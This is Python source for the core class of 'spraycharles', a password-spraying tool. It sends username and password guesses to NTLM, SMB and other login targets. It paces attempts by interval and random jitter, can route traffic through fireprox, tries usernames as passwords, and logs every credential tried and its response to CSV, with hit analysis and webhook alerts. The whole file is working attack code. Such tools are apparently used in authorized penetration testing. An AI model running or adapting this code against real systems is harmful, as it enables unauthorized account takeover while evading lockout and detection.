#!/usr/bin/env python3
import datetime
import logging
import pathlib
import random
import time
from pathlib import Path
from time import sleep

import requests
from rich import print
from rich.progress import Progress
from rich.table import Table
from rich.prompt import Confirm

from spraycharles import __version__
from spraycharles.lib.logger import console, logger
from spraycharles.analyze import Analyzer
from spraycharles.targets import all as all_modules


class Spraycharles:
    def __init__( self, user_list, user_file, password_list, password_file, host, module,
                 path, output, attempts, interval, equal, timeout, port, fireprox, domain,
                 analyze, jitter, jitter_min, notify, webhook, pause, no_ssl):

        self.passwords = password_list
        self.password_file = password_file
        self.usernames = user_list
        self.user_file = user_file
        self.host = host
        self.module = module
        self.path = path
        self.output = output
        self.attempts = attempts
        self.interval = interval
        self.equal = equal
        self.timeout = timeout
        self.port = port
        self.fireprox = fireprox
        self.domain = domain
        self.analyze = analyze
        self.jitter = jitter
        self.jitter_min = jitter_min
        self.notify = notify
        self.webhook = webhook
        self.pause = pause
        self.no_ssl = no_ssl

        self.total_hits = 0
        self.login_attempts = 0
        self.target = None
        self.log_name = None

        # 
        # Create spraycharles directories if they don't exist
        #
        user_home = Path.home()
        spraycharles_dir = user_home / ".spraycharles"
        logs_dir = spraycharles_dir / "logs"
        out_dir = spraycharles_dir / "out"
        
        spraycharles_dir.mkdir(exist_ok=True)
        logs_dir.mkdir(exist_ok=True)
        out_dir.mkdir(exist_ok=True)

        # 
        # Build default output file
        #
        current = datetime.datetime.now()
        timestamp = current.strftime("%Y%m%d-%H%M%S")
        if output == "output.csv":
            output = f"{user_home}/.spraycharles/out/{host}.{timestamp}.csv"


    def initialize_module(self):
        for target in all_modules:
            if self.module == target.NAME:
                logger.debug(f"Using {target.NAME} module")
                self.target = target(self.host, self.port, self.timeout, self.fireprox)
                 
                #
                # NTLM module requires path to be set
                #
                if self.target.NAME == "NTLM":
                    self.target.set_path(self.path)

        # Create the logfile
        user_home = str(Path.home())
        current = datetime.datetime.now()
        timestamp = int(round(current.timestamp()))

        self.log_name = f"{user_home}/.spraycharles/logs/{self.host}.{timestamp}.log"
        logging.basicConfig(
            filename=self.log_name,
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
        )

    def pre_spray_info(self):
        spray_info = Table(
            show_header=False,
            show_footer=False,
            min_width=61,
            title=f"Module: {self.module.upper()}",
            title_justify="left",
            title_style="bold reverse",
        )

        spray_info.add_row("Target", f"{self.target.url}")

        if self.domain:
            spray_info.add_row("Domain", f"{self.domain}")

        if self.attempts:
            spray_info.add_row("Interval", f"{self.interval} minutes")
            spray_info.add_row("Attempts", f"{self.attempts} per interval")

        if self.jitter:
            spray_info.add_row("Jitter", f"{self.jitter_min}-{self.jitter} seconds")

        if self.notify:
            spray_info.add_row("Notify", f"True ({self.notify})")

        log_name = pathlib.PurePath(self.log_name)
        out_name = pathlib.PurePath(self.output)
        spray_info.add_row("Logfile", f"{log_name.name}")
        spray_info.add_row("Results", f"{out_name.name}")

        console.print(spray_info)

        print()
        Confirm.ask(
            "[blue]Press enter to begin",
            default=True,
            show_choices=False,
            show_default=False,
        )
        print()

        if self.module == "SMB":
            logger.info(f"Initiaing SMB connection to {self.host}")
            if self.target.get_conn():
                logger.info(f"Connected to {self.host} over {'SMBv1' if self.target.smbv1 else 'SMBv3'}")
                logger.info(f"Hostname: {self.target.hostname}")
                logger.info(f"Domain: {self.target.domain}")
                logger.info(f"OS: {self.target.os}")
                print()
            else:
                logger.warning(f"Failed to connect to {self.host} over SMB")
                exit()

        self.target.print_headers(self.output)


    def _check_sleep(self):
        if self.login_attempts == self.attempts:
            #
            # optionally run result analysis
            #
            if self.analyze:
                analyzer = Analyzer(
                    self.output, self.notify, self.webhook, self.host, self.total_hits
                )
                new_hit_total = analyzer.analyze()

                # 
                # Pausing if specified by user before continuing with spray
                #
                if new_hit_total > self.total_hits and self.pause:
                    print()
                    logger.info("Successful login potentially identified. Pausing...")

                    Confirm.ask(
                        "[blue]Press enter to continue",
                        default=True,
                        show_choices=False,
                        show_default=False,
                    )
                    print()
            else:
                new_hit_total = (
                    0  # just set to zero since results aren't being analyzed mid-spray
                )
                print()

            #
            # sleep for interval
            #
            logger.info(f"Sleeping until {(datetime.datetime.now() + datetime.timedelta(minutes=self.interval)).strftime('%m-%d %H:%M:%S')}")
            time.sleep(self.interval * 60)
            print()

            #
            #  reset counter and set hit total
            #
            self.login_attempts = 0
            self.total_hits = new_hit_total


    def _check_file_contents(self, file_path, current_list):
        new_list = []
        try:
            with open(file_path, "r") as f:
                new_list = f.read().splitlines()
        except:
            # file either no longer exists, or -p flag was given a password and not a file
            pass

        additions = list(set(new_list) - set(current_list))
        return additions


    def _print_attempt(self, username, password, response):
        if response == "timeout":
            code = "TIMEOUT"
            length = "TIMEOUT"
        else:
            code = response.status_code
            length = str(len(response.content))
        print("%-27s %-17s %13s %15s" % (username, password, code, length))
        output = open(self.output, "a")
        output.write("%s,%s,%s,%s\n" % (username, password, code, length))
        output.close()


    def _login(self, username, password):
        try:
            response = self.target.login(username, password)
            self.target.print_response(response, self.output)
        except requests.ConnectTimeout as e:
            self.target.print_response(None, self.output, timeout=True)
        except (requests.ConnectionError, requests.ReadTimeout, OSError) as e:
            console.print(
                "\n[!] Connection error - sleeping for 5 seconds", style="danger"
            )
            sleep(5)
            self._login(username, password)


    def spray(self):
        # spray once with password = username if flag present
        if self.equal:
            with Progress(transient=True) as progress:
                task = progress.add_task(
                    f"[yellow]Equal Set", total=len(self.usernames)
                )
                for username in self.usernames:
                    password = username.split("@")[0]
                    if self.jitter is not None:
                        if self.jitter_min is None:
                            self.jitter_min = 0
                        time.sleep(random.randint(self.jitter_min, self.jitter))
                    self._login(username, password)
                    progress.update(task, advance=1)

                    # log the login attempt
                    logging.info(f"Login attempted as {username}")

            self.login_attempts += 1

        # spray using password file
        for password in self.passwords:
            # trigger sleep if attempts limit hit
            self._check_sleep()

            # check if user/pass files have been updated and add new entries to current lists
            # this will let users add (but not remove) users/passwords into the spray as it runs
            new_users = self._check_file_contents(self.user_file, self.usernames)
            new_passwords = self._check_file_contents(
                self.password_file, self.passwords
            )

            if len(new_users) > 0:
                console.print(
                    f"[>] Adding {len(new_users)} new users into the spray!",
                    style="info",
                )
                self.usernames.extend(new_users)

            if len(new_passwords) > 0:
                console.print(
                    f"[>] Adding {len(new_passwords)} new passwords to the end of the spray!",
                    style="info",
                )
                self.passwords.extend(new_passwords)

            # print line separator
            if len(new_passwords) > 0 or len(new_users) > 0:
                print()

            with Progress(transient=True) as progress:
                task = progress.add_task(
                    f"[green]Spraying: {password}", total=len(self.usernames)
                )
                while not progress.finished:
                    for username in self.usernames:
                        if self.domain:
                            username = f"{self.domain}\\{username}"
                        if self.jitter is not None:
                            if self.jitter_min is None:
                                self.jitter_min = 0
                            time.sleep(random.randint(self.jitter_min, self.jitter))
                        self._login(username, password)
                        progress.update(task, advance=1)

                        # log the login attempt
                        logging.info(f"Login attempted as {username}")

            self.login_attempts += 1

        # analyze the results to point out possible hits
        analyzer = Analyzer(
            self.output, self.notify, self.webhook, self.host, self.total_hits
        )
        analyzer.analyze()
